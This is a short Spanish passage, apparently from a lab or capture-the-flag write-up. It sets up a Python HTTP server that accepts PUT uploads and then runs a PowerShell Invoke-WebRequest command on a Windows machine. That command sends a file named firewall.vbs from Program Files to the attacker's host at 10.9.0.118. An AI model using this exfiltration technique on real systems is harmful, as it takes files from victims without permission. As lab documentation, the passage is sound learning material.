Creamos el servidor http en python
```Python
import http.server
import socketserver

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_PUT(self):
        length = int(self.headers['Content-Length'])
        path = self.translate_path(self.path)
        with open(path, 'wb') as f:
            f.write(self.rfile.read(length))
        self.send_response(200)
        self.end_headers()

PORT = 4444
with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print(f"Serving at port {PORT}")
    httpd.serve_forever()
```

Lo ejecutamos
![[Pasted image 20240807123242.png]]

Y ahora desde la maquina windows ejecutamos el siguiente comando
```
Invoke-WebRequest -Uri "http://10.9.0.118:4444/firewall.vbs" -Method Put -InFile "C:\Program Files (x86)\Spoofer\firewall.vbs"
```
![[Pasted image 20240807123316.png]]

Si volvemos a nuestra maquina veremos que el servidor ha recogido el archivo
![[Pasted image 20240807123343.png]]

Y tenemos por aqui el archivo
![[Pasted image 20240807123416.png]]

